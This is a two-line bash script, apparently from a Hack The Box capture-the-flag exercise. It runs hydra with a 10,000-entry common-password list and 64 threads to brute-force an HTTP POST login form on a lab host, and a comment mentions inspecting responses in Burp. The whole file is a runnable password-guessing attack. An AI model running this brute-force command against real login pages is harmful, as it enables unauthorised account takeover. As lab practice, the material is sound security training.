#!/bin/bash

hydra -l user -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt docker.hackthebox.eu -s 41036  http-post-form "/:password=^PASS^:Invalid" -t 64

# inspect response in burp
